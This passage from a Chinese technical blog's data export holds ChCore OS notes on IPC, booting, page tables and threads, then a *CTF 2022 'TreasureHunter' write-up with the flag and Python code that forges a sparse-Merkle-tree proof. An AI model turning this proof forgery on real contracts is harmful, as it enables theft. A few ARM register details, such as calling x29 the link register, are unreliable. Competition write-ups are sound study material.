ipc_send_cap(conn);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        arg = conn-&gt;buf.server_user_addr;</span><br><span class=\"line\">        thread_migrate_to_server(conn, arg);</span><br><span class=\"line\">   \t\tBUG(<span class=\"string\">&quot;This function should never\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> u64 <span class=\"title function_\">thread_migrate_to_server</span><span class=\"params\">(<span class=\"keyword\">struct</span> ipc_connection *conn, u64 arg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">target</span> =</span> conn-&gt;target;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">target_ipc_config</span> =</span></span><br><span class=\"line\">                (<span class=\"keyword\">struct</span> server_ipc_config *)(target-&gt;general_ipc_config);</span><br><span class=\"line\">        u64 callback = target_ipc_config-&gt;callback;</span><br><span class=\"line\">        conn-&gt;source = current_thread;</span><br><span class=\"line\">        current_thread-&gt;thread_ctx-&gt;state = TS_WAITING;</span><br><span class=\"line\">        target-&gt;active_conn = conn;</span><br><span class=\"line\">        obj_put(conn);</span><br><span class=\"line\">        arch_set_thread_stack(target, conn-&gt;server_stack_top);</span><br><span class=\"line\">        arch_set_thread_next_ip(target, callback);</span><br><span class=\"line\">        arch_set_thread_arg0(target, arg);</span><br><span class=\"line\">        arch_set_thread_arg1(target, current_thread-&gt;cap_group-&gt;pid);</span><br><span class=\"line\">        target-&gt;thread_ctx-&gt;sc = current_thread-&gt;thread_ctx-&gt;sc;</span><br><span class=\"line\">        switch_to_thread(target);</span><br><span class=\"line\">        eret_to_thread(switch_context());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"执行流\"><a href=\"#执行流\" class=\"headerlink\" title=\"执行流\"></a>执行流</h2><p>client先register_client，需要知道想要通信的服务端进程。</p>\n<p>创建连接会为服务端进程再创建一个线程，设置相同的vmspace (每个client都会在服务器进程创建一个线程作为单独的连接对象)</p>\n<p>client ipc_call时，不用sched，而是直接switch到target，将自己设置为waiting，不加入等待队列。需要设置参数和target为服务端的处理函数。</p>\n<p>server ipc_return时，设置client为running后直接switch到client，设置返回值</p>\n<p>由于ipc的操作都是进内核的，eret会直接返回到用户态，因此server返回到client时，执行ipc_call的下一条指令，切换到server的调用链直接被中止。由于ret addr不使用栈，因此也不会对内核栈产生很大的破坏。</p>\n<h2 id=\"共享内存\"><a href=\"#共享内存\" class=\"headerlink\" title=\"共享内存\"></a>共享内存</h2><p>每个connection会创建pmo，同时映射到client和server的地址空间</p>\n<p>client和server的thread是一对一的，但是即使是不同的thread也是服务在同一个写死的地址上，所以需要根据不同情况算偏移找不同的位置。</p>\n<ul>\n<li>server: 同一个dispatch会需要支持不同client访问，每次create_connection时会得到不同的连接，server对于IPC提供的缓冲区根据不同connection id找到偏移 服务不同客户</li>\n<li>client：同一个cilent会需要和不同的server通信，每次register client会拿到不同client id，client对于IPC提供的缓冲区根据不同的client id找到偏移，请求不同的服务</li>\n</ul>\n<p>每个client创建pmo，然后映射到服务端的地址都不会重复。buf和stack各需要一个pmo</p>\n<ul>\n<li><p><code>buf_addr</code>为A-stack client server共享内存 传递参数</p>\n</li>\n<li><p><code>stack_addr</code>为E-stack server thread执行用</p>\n</li>\n</ul>\n<h2 id=\"消息传递\"><a href=\"#消息传递\" class=\"headerlink\" title=\"消息传递\"></a>消息传递</h2><p>client通过<code>ipc_create_msg</code> 会把消息直接写入到共享内存的开头，在迁移线程时设置地址为服务端共享内存地址即可（两端虚拟地址不一样，但物理地址一样）</p>\n<p>共享内存首地址即为msg对象(元数据)，而紧接着msg对象的就是msg所带data </p>\n<p>可以自己为每种不同的IPC定义request结构体，然后直接进行类型转换</p>\n<p>以文件系统为例，共享内存布局如下</p>\n<p>msg元数据—fs_request元数据—文件数据</p>\n<h2 id=\"cap\"><a href=\"#cap\" class=\"headerlink\" title=\"cap\"></a>cap</h2><p>需要传递资源给server</p>\n<p>很多IPC的操作是被写在kernel里的，kernel的地址空间是共用的，因此即使是不同进程本地修改cap，在context switch到另一个进程时，修改仍有效</p>\n","categories":["chcore"]},{"title":"chcore-misc","url":"/2024/01/22/chcore/notes/","content":"<h1 id=\"chcore-misc\"><a href=\"#chcore-misc\" class=\"headerlink\" title=\"chcore-misc\"></a>chcore-misc</h1><h2 id=\"arm架构\"><a href=\"#arm架构\" class=\"headerlink\" title=\"arm架构\"></a>arm架构</h2><p><code>xxx_elk</code> k&#x3D;0 1 2 3 寄存器表示这个寄存器只能在elk的特权等级访问</p>\n<ul>\n<li>el0 用户进程</li>\n<li>el1 操作系统</li>\n<li>el2 虚拟化</li>\n<li>el3 trustzone</li>\n</ul>\n<p>call指令为bl 不使用栈 而是用寄存器<code>x29</code>作为link register <code>ret</code>时从LR中取返回地址</p>\n<p><code>SP_EL0</code> <code>SP_EL1</code> 不同特权等级用不同的栈寄存器 所以不需要放到栈中进行保存和恢复</p>\n<p><code>svc</code>进入内核</p>\n<p><code>eret</code>从当前特权等级k返回 返回地址在ELR_EL3  可以从el1到el0 也可以从el3到el1</p>\n<h2 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h2><p>树莓派启动</p>\n<ol>\n<li>通过树莓派厂商写死的GPU来初始化CPU</li>\n<li>firmware</li>\n<li>运行kernel.img  cpu从0x80000处执行第一行代码</li>\n</ol>\n<p>对于笔记本 用BIOS (basic input output system)  嵌入式设备（手机）不用BIOS</p>\n<p>将可启动设备(磁盘 MBR 0柱面0磁头0扇区 主引导扇区)512字节加载到0x7c00 然后执行 即bootloader</p>\n<p>x86 cpu reset后指向0xffff0地址 即bios物理地址</p>\n<h2 id=\"ChCore启动\"><a href=\"#ChCore启动\" class=\"headerlink\" title=\"ChCore启动\"></a>ChCore启动</h2><p>编译生成elf时需要排序所有.o 并且设置第一行指令在地址0x80000</p>\n<ol>\n<li><p>从elX切换到el1</p>\n</li>\n<li><p>初始化栈  栈实际上是c编译后的elf文件一个已经分配好的空间(4k) 只要把sp设置好就行</p>\n<p>由于arm架构使用link register保存返回地址 所以之前的函数调用没有嵌套 可以不需要栈</p>\n<p>对于c函数的编译器，并不认为这段c程序是内核初始化，所以仍会一样编译。即使不需要把返回地址压栈，也需要进行传参、寄存器保护等用栈的操作，所以一定要在调用c程序之前初始化好栈。</p>\n<p>当初始化好栈之后，完全可以用c语言而非汇编来编程，除非需要用到msr等系统isa指令</p>\n</li>\n<li><p>页表初始化</p>\n<p>ttbr：x86下的cr3  translation table base register</p>\n<p>只用48bit     0000+48bit ttbr0翻译；ffff+48bit ttbr1翻译  cpu根据虚拟地址前缀判断使用哪个翻译</p>\n<p>ttbr0和ttbr1都是_el1</p>\n<p>多级页表 ttbr0_el1_l0 指向ttbr0_el1_l1 指向ttbr0_el1_l2  都是数组 共512个entry 是下一级页表地址或物理地址 用一个bit记录</p>\n<p>4级页表  并不是只能最后一级指向物理地址，可以使用大页。这里初始化使用2M大页 之后会拆成4K</p>\n<p>虚拟内存最大256T</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>PTE</th>\n<th>指向物理内存大小</th>\n<th>index</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>L0</td>\n<td>L1地址</td>\n<td>512G</td>\n<td>9bit</td>\n</tr>\n<tr>\n<td>L1</td>\n<td>L2地址</td>\n<td>1G</td>\n<td>9bit</td>\n</tr>\n<tr>\n<td>L2</td>\n<td>L3地址</td>\n<td>2M</td>\n<td>9bit</td>\n</tr>\n<tr>\n<td>L3</td>\n<td>物理内存地址</td>\n<td>4k</td>\n<td>9bit</td>\n</tr>\n</tbody></table>\n<p>最后12bit是页偏移 VA与PA相同</p>\n<p>0-1G是物理地址，1G-4G是设备地址，设备地址的值随时会变化 所以不允许缓存 PTE64bit 除了记录物理地址的36bit(12bit偏移不需要) 其他bit可用作记录页信息 比如不同特权等级的读写权限</p>\n<p>将ttbr1与ttbr0的最后一级页表记录的物理地址范围设置成相同（0G到4G 每个entry2M）这样低地址与高地址的虚拟地址翻译会映射到同一块物理地址，执行相同的代码</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>VA</th>\n<th>PA</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ttbr0</td>\n<td>0G-1G</td>\n<td>0G-1G</td>\n</tr>\n<tr>\n<td>ttbr1</td>\n<td>0xffffff0000000000 ,1G</td>\n<td>0G-1G</td>\n</tr>\n</tbody></table>\n</li>\n<li><p>开启mmu （设置<code>sctlr_el1</code>寄存器的某些bit）从下一条指令开始cpu会自动做地址翻译</p>\n<p>应用程序跑在低地址 操作系统跑在高地址 start_kernal从0xffffff0000000000开始</p>\n<p>内核高地址 由ttbr1翻译 得到相同PA</p>\n<p>应用程序低地址 由ttbr0翻译 得到不同PA</p>\n</li>\n<li><p>初始化异常向量表 每一项对应一个函数地址(汇编)</p>\n<p>对于syscall这个同步异常，构建syscall table 每个系统调用号对应一个函数(void*)</p>\n</li>\n</ol>\n<h2 id=\"VA\"><a href=\"#VA\" class=\"headerlink\" title=\"VA\"></a>VA</h2><p>天然隔离性好</p>\n<p>每个CPU核有一个TLB 作为页表的缓存</p>\n<ul>\n<li><p>进程切换 刷TLB</p>\n<p>ASID TLB与页表同时记录 这样就不需要每次刷</p>\n</li>\n<li><p>修改页表映射 刷TLB (修改页表映射操作的内存使用的缓存并不是TLB TLB是缓存查找PA)</p>\n</li>\n<li><p>如果其他核也运行了当前进程 则其他核TLB也需要刷</p>\n</li>\n</ul>\n<h2 id=\"PA\"><a href=\"#PA\" class=\"headerlink\" title=\"PA\"></a>PA</h2><p>开启地址翻译后，物理地址实际上也不可见 不可管理了</p>\n<p>内核映射到高地址段，通过分配高地址段的虚拟空间来管理实际的物理内存</p>\n<p>buddy system存在于内核的虚拟空间中 但映射到真实的物理内存 从而进行管理</p>\n<p>用户态需要的虚拟空间经过buddy system分配 所以物理内存上的每个page可能会对应两个虚拟地址，但是内核自己只负责管理，是不会修改的，如果出bug了修改用户空间 称为踩内存</p>\n<p>buddy system实际上占用的内存只有metadata，每个物理页会对应一个page数据结构  记录物理页实际大小，需要访存修改的只有metadata 而操作的物理页地址实际上是虚拟地址，并且只需要根据虚拟地址找到metadata和buddy 并不需要访问内容，所以即使内核的start_addr指向的虚拟空间部分并没有映射到真实物理空间也没有关系。</p>\n<h2 id=\"page-table\"><a href=\"#page-table\" class=\"headerlink\" title=\"page table\"></a>page table</h2><p>所有page都是通过buddy_system拿到的，都是虚拟地址，存PTE时需要转换成物理地址</p>\n<p>PTE需要按给定格式存，最后一位是valid，硬件通过这个bit判断是否缺页(异常，给内核处理)</p>\n<p>如果需要换页，只要valid为0触发缺页，其他bit全自己定义即可，与硬件无关</p>\n<p>mmu访问时会改pte的access bit 方便换页策略</p>\n<p>换页需要有反向映射 修改所有映射到被换出的物理页的虚拟页的PTE</p>\n<h2 id=\"programe\"><a href=\"#programe\" class=\"headerlink\" title=\"programe\"></a>programe</h2><p><code>create_root_thread</code>创建进程 同时创建线程</p>\n<ul>\n<li>进程：创建pmo，加载二进制文件，地址映射</li>\n<li>线程：线程上下文，加入调度队列</li>\n</ul>\n<p>对于spawn创建线程，自己加载好二进制，通过各种系统调用拿到pmo，地址映射，创建线程</p>\n<h2 id=\"线程\"><a href=\"#线程\" class=\"headerlink\" title=\"线程\"></a>线程</h2><p>进程的地址空间，包含共享的堆，不同线程的内核栈和线程栈（用户态）</p>\n<p>chcore中，内核栈地址即为kmalloc拿到的thread结构体的地址，访问thread结构体的成员正好是在内存中栈的对应位置</p>\n<p>而线程栈是用户在发出创建线程时手动指定的。内核中的代码sp均为内核栈地址，用户态地址在指定后存在sp_el0中，上下文切换时保存恢复，eret后sp为此地址</p>\n","categories":["chcore"]},{"title":"TreasureHunter","url":"/2024/01/22/ctf/sc/","content":"<h1 id=\"TreasureHunter\"><a href=\"#TreasureHunter\" class=\"headerlink\" title=\"TreasureHunter\"></a>TreasureHunter</h1><p>*CTF 2022 - Ph0t1n1a</p>\n<ul>\n<li>比赛时间：2022-04-16周六 09:00:00——2022-04-17周日 09:00:00 24h</li>\n<li>平台链接：<a href=\"https://starctf2022.xctf.org.cn/\">https://starctf2022.xctf.org.cn/</a></li>\n</ul>\n<p>*ctf{9bd0d273037935c5eeaa94968f107622}</p>\n<p>enter4次+pickupTreasureChest+findKey 核心是构造proof满足root的检验<br><code>keccak256(abi.encode(l, r))</code>碰撞是不可能的 只能记录每个root生成的记录</p>\n<p>用python本地调试</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> eth_abi <span class=\"keyword\">import</span> encode_abi</span><br><span class=\"line\"><span class=\"keyword\">from</span> web3 <span class=\"keyword\">import</span> Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&quot;http://123.60.45.88:8545&quot;</span>)) </span><br><span class=\"line\">keccak = w3.keccak</span><br><span class=\"line\"></span><br><span class=\"line\">SMT_STACK_SIZE = <span class=\"number\">32</span></span><br><span class=\"line\">DEPTH = <span class=\"number\">160</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cout = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">abi</span>(<span class=\"params\">a,b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> a!= <span class=\"number\">0</span> <span class=\"keyword\">and</span> b!=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"comment\">#res = encode_abi([&#x27;bytes32&#x27;,&#x27;bytes32&#x27;],[a,b])</span></span><br><span class=\"line\">    res = <span class=\"string\">b&#x27;\\x00&#x27;</span>* (<span class=\"number\">32</span>-<span class=\"built_in\">len</span>(a)) + a + <span class=\"string\">b&#x27;\\x00&#x27;</span>* (<span class=\"number\">32</span>-<span class=\"built_in\">len</span>(b)) + b</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(res) == <span class=\"number\">64</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calcLeaf</span>(<span class=\"params\">a</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a.value == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        key_hex = <span class=\"built_in\">hex</span>(a.key)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(key_hex) &amp; <span class=\"number\">1</span>:</span><br><span class=\"line\">            key_hex = <span class=\"string\">&#x27;0&#x27;</span>+ key_hex</span><br><span class=\"line\">        value_hex = <span class=\"string\">b&#x27;\\x00&#x27;</span> <span class=\"keyword\">if</span> a.value == <span class=\"number\">0</span> <span class=\"keyword\">else</span> <span class=\"string\">b&#x27;\\x01&#x27;</span></span><br><span class=\"line\">        res = keccak(abi(<span class=\"built_in\">bytes</span>.fromhex(key_hex), value_hex))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cout:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;leaf:<span class=\"subst\">&#123;res.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(res) == <span class=\"number\">32</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge</span>(<span class=\"params\">l,r</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> l==<span class=\"number\">0</span>:</span><br><span class=\"line\">        res = r</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> r ==<span class=\"number\">0</span>:</span><br><span class=\"line\">        res = l</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        res = keccak(abi(l, r))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cout:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;merge <span class=\"subst\">&#123;l.<span class=\"built_in\">hex</span>()&#125;</span>,<span class=\"subst\">&#123;r.<span class=\"built_in\">hex</span>()&#125;</span> to <span class=\"subst\">&#123;res.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">checkGroupSorted</span>(<span class=\"params\">_leaves</span>):</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(_leaves) &gt;= <span class=\"number\">1</span></span><br><span class=\"line\">        temp = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(_leaves)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> temp &gt;= <span class=\"built_in\">int</span>(_leaves[i].key):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">            temp = <span class=\"built_in\">int</span>(_leaves[i].key)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getBit</span>(<span class=\"params\">key,height</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> height &lt;= DEPTH</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (key &gt;&gt; height) &amp; <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">copyBit</span>(<span class=\"params\">key,height</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> height &lt;= DEPTH</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (key &gt;&gt; height) &lt;&lt; height</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">parentPath</span>(<span class=\"params\">key,height</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> height &lt;= DEPTH</span><br><span class=\"line\">    <span class=\"keyword\">return</span> copyBit(key,height+<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calcRoot</span>(<span class=\"params\">_proofs,_leaves,_root</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> checkGroupSorted(_leaves)</span><br><span class=\"line\">    stackKeys = []</span><br><span class=\"line\">    stackValues = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SMT_STACK_SIZE):</span><br><span class=\"line\">        stackKeys.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">        stackValues.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    proofIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">    leaveIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">    stackTop = <span class=\"number\">0</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> proofIndex &lt; <span class=\"built_in\">len</span>(_proofs):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>) == <span class=\"number\">0x4c</span>:</span><br><span class=\"line\">            proofIndex+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> stackTop &lt; SMT_STACK_SIZE</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> leaveIndex &lt; <span class=\"built_in\">len</span>(_leaves)</span><br><span class=\"line\">            stackKeys[stackTop] = <span class=\"built_in\">int</span>(_leaves[leaveIndex].key)</span><br><span class=\"line\">            stackValues[stackTop] = calcLeaf(_leaves[leaveIndex])</span><br><span class=\"line\">            stackTop+=<span class=\"number\">1</span></span><br><span class=\"line\">            leaveIndex+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"comment\">#print(f&#x27;push:&#123;stackKeys[stackTop-1]&#125;,&#123;stackValues[stackTop-1]&#125;&#x27;)</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>) == <span class=\"number\">0x50</span>:</span><br><span class=\"line\">            proofIndex+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> stackTop != <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> proofIndex + <span class=\"number\">2</span> &lt;= <span class=\"built_in\">len</span>(_proofs)</span><br><span class=\"line\">            height = <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>)</span><br><span class=\"line\">            proofIndex += <span class=\"number\">1</span></span><br><span class=\"line\">            currentProof = _proofs[proofIndex]</span><br><span class=\"line\">            proofIndex += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> currentProof != _root</span><br><span class=\"line\">            <span class=\"keyword\">if</span> getBit(stackKeys[stackTop - <span class=\"number\">1</span>], height) == <span class=\"number\">1</span>:</span><br><span class=\"line\">                stackValues[stackTop - <span class=\"number\">1</span>] = merge(currentProof, stackValues[stackTop - <span class=\"number\">1</span>])</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                stackValues[stackTop - <span class=\"number\">1</span>] = merge(stackValues[stackTop - <span class=\"number\">1</span>], currentProof)</span><br><span class=\"line\">            <span class=\"comment\">#print(stackValues[stackTop - 1])</span></span><br><span class=\"line\">            stackKeys[stackTop - <span class=\"number\">1</span>] = parentPath(stackKeys[stackTop - <span class=\"number\">1</span>], height)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>) == <span class=\"number\">0x48</span> :</span><br><span class=\"line\">            proofIndex+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> stackTop &gt;= <span class=\"number\">2</span></span><br><span class=\"line\">            <span class=\"keyword\">assert</span> proofIndex &lt; <span class=\"built_in\">len</span>(_proofs)</span><br><span class=\"line\">            height = <span class=\"built_in\">int</span>(_proofs[proofIndex].<span class=\"built_in\">hex</span>(),base=<span class=\"number\">16</span>)</span><br><span class=\"line\">            proofIndex += <span class=\"number\">1</span></span><br><span class=\"line\">            aSet = getBit(stackKeys[stackTop - <span class=\"number\">2</span>], height)</span><br><span class=\"line\">            bSet = getBit(stackKeys[stackTop - <span class=\"number\">1</span>], height)</span><br><span class=\"line\">            stackKeys[stackTop - <span class=\"number\">2</span>] = parentPath(stackKeys[stackTop - <span class=\"number\">2</span>], height)</span><br><span class=\"line\">            stackKeys[stackTop - <span class=\"number\">1</span>] = parentPath(stackKeys[stackTop - <span class=\"number\">1</span>], height)</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> stackKeys[stackTop - <span class=\"number\">2</span>] == stackKeys[stackTop - <span class=\"number\">1</span>] <span class=\"keyword\">and</span> aSet != bSet</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> aSet == <span class=\"number\">1</span>:</span><br><span class=\"line\">                stackValues[stackTop - <span class=\"number\">2</span>] = merge(</span><br><span class=\"line\">                    stackValues[stackTop - <span class=\"number\">1</span>],</span><br><span class=\"line\">                    stackValues[stackTop - <span class=\"number\">2</span>]</span><br><span class=\"line\">                    )</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                stackValues[stackTop - <span class=\"number\">2</span>] = merge(</span><br><span class=\"line\">                    stackValues[stackTop - <span class=\"number\">2</span>],</span><br><span class=\"line\">                    stackValues[stackTop - <span class=\"number\">1</span>]</span><br><span class=\"line\">                    )</span><br><span class=\"line\">            stackTop -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span>()</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">assert</span> leaveIndex == <span class=\"built_in\">len</span>(_leaves)</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> stackTop == <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> stackValues[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Leaf</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,k,v</span>):</span><br><span class=\"line\">        self.key = k</span><br><span class=\"line\">        self.value = v</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">init</span>():</span><br><span class=\"line\">    hunters = []</span><br><span class=\"line\">    prevLeaves = []</span><br><span class=\"line\">    nextLeaves = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">        hunters.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">        prevLeaves.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">        nextLeaves.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    hunters[<span class=\"number\">0</span>] = <span class=\"number\">0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e</span></span><br><span class=\"line\">    hunters[<span class=\"number\">1</span>] = <span class=\"number\">0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45</span></span><br><span class=\"line\">    hunters[<span class=\"number\">2</span>] = <span class=\"number\">0x6B175474E89094C44Da98b954EedeAC495271d0F</span></span><br><span class=\"line\">    hunters[<span class=\"number\">3</span>] = <span class=\"number\">0x6B3595068778DD592e39A122f4f5a5cF09C90fE2</span></span><br><span class=\"line\">    hunters[<span class=\"number\">4</span>] = <span class=\"number\">0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B</span></span><br><span class=\"line\">    hunters[<span class=\"number\">5</span>] = <span class=\"number\">0xc00e94Cb662C3520282E6f5717214004A7f26888</span></span><br><span class=\"line\">    hunters[<span class=\"number\">6</span>] = <span class=\"number\">0xD533a949740bb3306d119CC777fa900bA034cd52</span></span><br><span class=\"line\">    hunters[<span class=\"number\">7</span>] = <span class=\"number\">0xdAC17F958D2ee523a2206206994597C13D831ec7</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">        prevLeaves[i] = Leaf(hunters[i],<span class=\"number\">0</span>)</span><br><span class=\"line\">        nextLeaves[i] = Leaf(hunters[i],<span class=\"number\">1</span>)</span><br><span class=\"line\">    proof = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">22</span>):</span><br><span class=\"line\">        proof.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000095&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000099&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] =<span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span 